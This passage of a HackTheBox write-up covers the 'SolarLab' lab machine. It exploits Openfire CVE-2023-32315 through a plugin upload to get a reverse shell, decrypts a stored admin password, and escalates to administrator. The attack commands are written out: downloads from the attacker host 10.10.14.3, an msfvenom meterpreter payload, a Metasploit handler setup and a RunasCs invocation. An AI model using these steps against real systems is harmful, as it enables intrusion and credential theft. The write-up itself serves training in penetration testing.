+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%209.png" alt="Untitled" 
+             />
+    </label></p>
+<p>Although it didn’t create a session for us, it did create an admin user, which allowed us to log in to the application.</p>
+<p>I downloaded <strong><code>openfire-management-tool-plugin.jar</code></strong> from <a href="https://github.com/miko550/CVE-2023-32315">this GitHub repository</a>.</p>
+<p>Then, I uploaded it in the Plugins tab. To do this, I changed the <strong><code>uploadsuccess=false</code></strong> to <strong><code>true</code></strong> in order to successfully upload our plugin. By default, the <strong><code>uploadsuccess</code></strong> parameter is set to <strong><code>false</code></strong>, which prevents the upload. I changed it to <strong><code>true</code></strong> to successfully upload the plugin.</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-86fba" hidden>
+    <label for="zoomCheck-86fba">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%2010.png" alt="Untitled" 
+             />
+    </label></p>
+<p>After uploading the plugin, navigate to Server &gt; Server Settings &gt; Management Tool. Set the password as &lsquo;123&rsquo;, then select &lsquo;System Command&rsquo;.</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-782a8" hidden>
+    <label for="zoomCheck-782a8">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%2011.png" alt="Untitled" 
+             />
+    </label></p>
+<p>We found a shell execution point. I decided to execute a payload similar to the one used previously. I generated the payload from the same website I used before. Then, I launched <strong><code>nc</code></strong> and started listening on port 6565 to receive the reverse shell. Finally, I executed the PowerShell reverse shell payload from the website.</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-e870e" hidden>
+    <label for="zoomCheck-e870e">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%2012.png" alt="Untitled" 
+             />
+    </label></p>
+<p>After executing the command, I gained shell access for the user <strong><code>solarlab\openfire</code></strong>.</p>
+<p>I discovered interesting credentials within the <strong><code>openfire.script</code></strong> file located at the <strong><code>PS C:\Program Files\Openfire\embedded-db\</code></strong> directory.</p>
+<pre tabindex="0"><code>// NOTE: ONLY IMPORTANT DETAILS EXTRACTED FRROM THE SCRIPT IS SHOWN BELOW
+CREATE USER SA PASSWORD DIGEST &#39;d41d8cd98f00b204e9800998ecf8427e&#39;
+
+INSERT INTO OFPROPERTY VALUES(&#39;passwordKey&#39;,&#39;hGXiFzsKaAeYLjn&#39;,0,NULL)
+INSERT INTO OFUSER VALUES(&#39;admin&#39;,&#39;gjMoswpK+HakPdvLIvp6eLKlYh0=&#39;,&#39;9MwNQcJ9bF4YeyZDdns5gvXp620=&#39;,&#39;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#39;,4096,NULL,&#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#39;,&#39;Administrator&#39;,&#39;admin@solarlab.htb&#39;,&#39;001700223740785&#39;,&#39;0&#39;)
+</code></pre><p>I received an encrypted password and a passkey. To decrypt the password, I used them together with <a href="https://github.com/c0rdis/openfire_decrypt">https://github.com/c0rdis/openfire_decrypt</a>. Following the instructions, I compiled the JAR file:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">javac OpenFireDecryptPass.java
+</span></span></code></pre></div><p>This command compiled the JAR file. To crack the hash, I executed:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">java OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
+</span></span></code></pre></div><p>In this command, the first argument is the encrypted password, and the second one is the passkey. Through this process, I successfully cracked the hashes, revealing the credentials:</p>
+<p><strong><code>Administrator:ThisPasswordShouldDo!@</code></strong></p>
+<p>Now, I am armed with these credentials.</p>
+<p>I installed sudo <strong><code>wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip</code></strong> on my Kali machine and then transferred the .exe file inside the zip to my target machine using <strong><code>Invoke-WebRequest &quot;http://10.10.14.3:8888/RunasCs.exe&quot; -OutFile &quot;runascs.exe&quot;</code></strong>. After that, I created a payload with msfvenom: <strong><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9898 -f exe -o shell.exe</code></strong> and then sent the shell.exe file to the target machine using: <strong><code>Invoke-WebRequest &quot;http://10.10.14.3/shell.exe&quot; -OutFile &quot;shell.exe&quot;</code></strong>.</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-95b8f" hidden>
+    <label for="zoomCheck-95b8f">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%2013.png" alt="Untitled" 
+             />
+    </label></p>
+<p>Now that I have both of the .exe files on my target machine, I will use the multi/handler in Metasploit to capture the shell.</p>
+<p>To set up the multi/handler, I ran these commands sequentially:</p>
+<ul>
+<li><strong><code>msfconsole</code></strong></li>
+<li><strong><code>use multi/handler</code></strong></li>
+<li><strong><code>set payload windows/x64/meterpreter/reverse_tcp</code></strong></li>
+<li><strong><code>set lhost tun0</code></strong></li>
+<li><strong><code>set lport 9898</code></strong></li>
+<li><strong><code>run</code></strong></li>
+</ul>
+<p>After that, I went to my target machine and executed the command:
+<strong><code>.\runascs.exe Administrator ThisPasswordShouldDo!@ shell.exe</code></strong></p>
+<p>Upon running the above code, I observed that the meterpreter shell popped up, and I gained administrator access. 🙂</p>
+<p>We rooted this box! Yay!</p>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>Thanks for following my writeup on this box. I hope you learned something new from my methodology.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/hackthebox/">HackTheBox</a></li>
+      <li><a href="http://localhost:1313/tags/windows/">Windows</a></li>
+      <li><a href="http://localhost:1313/tags/medium/">Medium</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/writeups/hackthebox/magicgardens/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>MagicGardens Writeup - HackTheBox</span>
+  </a>
+  <a class="next" href="http://localhost:1313/writeups/hackthebox/intuition/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Intuition Writeup - HackTheBox</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">Rezy Dev</a></span> · 
+
+    <span>
+        <a href="https://creativecommons.org/licenses/by-nc/4.0/" rel="noopener noreferrer" target="_blank">Some rights reserved</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
